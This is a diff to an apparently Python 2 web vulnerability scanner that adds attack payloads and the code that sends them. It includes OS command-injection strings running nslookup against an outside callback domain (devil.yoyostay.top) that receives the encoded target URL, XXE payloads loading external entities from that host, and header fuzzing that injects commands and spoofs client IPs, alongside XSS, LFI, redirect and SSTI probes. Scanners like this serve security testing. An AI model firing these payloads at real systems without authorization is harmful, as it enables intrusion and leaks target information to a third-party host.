@@ -10,6 +10,7 @@ import urllib
 import re
 import json
 import base64
+import copy
 import time
 import sys
 import argparse
@@ -57,16 +58,20 @@ XSS_Rule = {
     ],
 
     "cli" : [
-        "$(nslookup {domain})",
-        '&nslookup {domain}&\'\\"`0&nslookup {domain}&`\'',
-        "nslookup {domain}|nslookup {domain}&nslookup {domain}",
-        "'nslookup {domain}|nslookup {domain}&nslookup {domain}'",
-        '"nslookup {domain}|nslookup {domain}&nslookup {domain}"',
-        ";nslookup {domain}|nslookup {domain}&nslookup {domain};"
+        "$(nslookup {domain}.devil.yoyostay.top)",
+        '&nslookup {domain}.devil.yoyostay.top&\'\\"`0&nslookup {domain}.devil.yoyostay.top&`\'',
+        "nslookup {domain}.devil.yoyostay.top|nslookup {domain}.devil.yoyostay.top&nslookup {domain}.devil.yoyostay.top",
+        # "'nslookup {domain}|nslookup {domain}&nslookup {domain}'",
+        # '"nslookup {domain}|nslookup {domain}&nslookup {domain}"',
+        ";nslookup {domain}.devil.yoyostay.top|nslookup {domain}.devil.yoyostay.top&nslookup {domain}.devil.yoyostay.top;"
     ],
     'ssti' : [
         '{{1357924680 * 2468013579}}',
         '${1357924680 * 2468013579}'
+    ],
+    'xxe' : [
+        '<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://soapxxe_{domain}.devil.yoyostay.top/"> %dtd;]><xxx/>]]></foo></soap:Body>',
+        '<?xml version="1.0" encoding="utf-8"?>\n\n<!DOCTYPE r [\n\n<!ENTITY r ANY>\n\n<!ENTITY sp SYSTEM "http://xxe_{domain}.devil.yoyostay.top/">\n\n]>\n\n<r>&sp;</r>'
     ]
 }
 
@@ -227,47 +232,88 @@ class detectXSS(threading.Thread):
                 query = hj.url.get_query
             else:
                 if hj.headers.get('Content-Type', '').find('json') >= 0:
-                    query = urllib.encode(json.loads(hj.data))
+                    # print "with json, data is {}".format(hj.data)
+                    query = urllib.urlencode(json.loads(hj.data))
                     isjson=True
                 else:
                     query = hj.data
-
+            # domain to replace
+            domain = base64.b64encode(hj.url.url_string()).replace('=', '')
             for p in XSS_Rule:
-                if p == 'cli':
-                    domain = base64.b64encode(hj.url.url_string()).replace('=', '')
-                    p.replace('{domain}', domain)
-                poll = Pollution(query, XSS_Rule[p], isjson=isjson).payload_generate()
-                # poll is dict list
-                for payload in poll:
-                    if hj.method == 'GET':
-                        hj.url.get_dict_query = payload
-                    else:
-                        if isjson:
-                            hj.data = json.dumps(payload)
+                if p in ['cli', 'xxe']:
+                    copy_rules = copy.copy(XSS_Rule[p])   # copy a rules to replace the {domain}
+                    copy_rules = [pp.replace('{domain}', domain) for pp in copy_rules]
+                else:
+                    copy_rules = XSS_Rule[p]
+                    # print "no cli,xxe rulse  {}".format(copy_rules)
+                    # p.replace('{domain}', domain)
+                if p == 'xxe':
+                    # if payload type is xxe, we only need to chage the Content-Type to application/xml
+                    # and method to POST
+                    # then request
+                    ContentType_status = hj.headers.get('Content-Type', '')
+                    hj.headers['Content-Type'] = 'application/xml'
+                    method_status = hj.method
+                    hj.method = 'POST'
+                    for rule in copy_rules:
+                        hj.data = rule
+                        hj.request()
+                    hj.method = method_status
+                    hj.headers['Content-Type'] = ContentType_status
+                else:
+                        # hj.data = XSS_Rule[p]
+                    # print copy_rules
+                    poll = Pollution(query, copy_rules, isjson=isjson).payload_generate()
+                    # print poll
+                    # poll is dict list
+                    for payload in poll:
+                        if hj.method == 'GET':
+                            hj.url.get_dict_query = payload
                         else:
-                            hj.data = urllib.urlencode(payload)
-                    #print hj.url.url_string()
-                    time.sleep(self.delay)
-                    status_code, headers, content, t = hj.request()
-                    if p == 'xss':
-                        for regex in XSS_Rule[p]:
-                            if regex in content and status_code == 200 and headers.get('Content-Type', '')  not in  ["application/json", "text/plain", "application/javascript", "text/json", "text/javascript", "application/x-javascript"]:
-                                self.outqueue.put(('XSS', payload, hj.response.request.url))
+                            if isjson:
+                                hj.data = json.dumps(payload)
+                            else:
+                                hj.data = urllib.urlencode(payload)
+                        #print hj.url.url_string()
+                        time.sleep(self.delay)
+                        status_code, headers, content, t = hj.request()
+                        if p == 'xss':
+                            for regex in XSS_Rule[p]:
+                                print hj.headers.get('Cookie')
+                                print status_code, headers.get('Content-Type', '')
+                                if regex in content and status_code == 200 and headers.get('Content-Type', '')  not in  ["application/json", "text/plain", "application/javascript", "text/json", "text/javascript", "application/x-javascript"]:
+                                    print "-------------------------------------"
+                                    self.outqueue.put(('XSS', payload, hj.response.request.url))
+                                    break
+                        if p == 'lfi':
+                            if "root:x:0" in content and status_code == 200:
+                                self.outqueue.put(('LFI', payload, hj.response.request.url))
                                 break
-                    if p == 'lfi':
-                        if "root:x:0" in content and status_code == 200:
-                            self.outqueue.put(('LFI', payload, hj.response.request.url))
-                            break
-                    if p == 'redirect':
-                        if 'Valar Morghulis' in content and status_code == 200:
-                            self.outqueue.put(('Unsafe Redirect', payload, hj.response.request.url))
-                            break
+                        if p == 'redirect':
+                            if 'Valar Morghulis' in content and status_code == 200:
+                                self.outqueue.put(('Unsafe Redirect', payload, hj.response.request.url))
+                                break
 
-                    if p == 'ssti':
-                        if '3351376549499229720' in content and status_code == 200:
-                            self.outqueue.put(('SSTI', payload, hj.response.request.url))
-                            break
+                        if p == 'ssti':
+                            if '3351376549499229720' in content and status_code == 200:
+                                self.outqueue.put(('SSTI', payload, hj.response.request.url))
+                                break
 
+
+            # FUZZ THE HTTP HEADERS
+            hj.headers['Client-IP'] = '127.0.0.1'
+            hj.headers['X-Forwarded-For'] = '127.0.0.1'
+            hj.headers['Referer'] = 'http://www.baidu.com' if 'Referer' not in hj.headers else hj.headers['Referer']
+            real_headers = hj.headers.copy()
+            cli_payloads = copy.copy(XSS_Rule['cli'])
+            cli_payloads = [p.replace('{domain}', domain) for p in cli_payloads]
+            for payload in cli_payloads:
+                hj.headers['User-Agent'] = real_headers['User-Agent'] + payload
+                hj.headers['Client-IP'] = real_headers['Client-IP'] + payload
+                hj.headers['X-Forwarded-For'] = real_headers['X-Forwarded-For'] + payload
+                hj.headers['Referer'] = real_headers['Referer'] + payload
+                hj.request()
+            
 
 
 
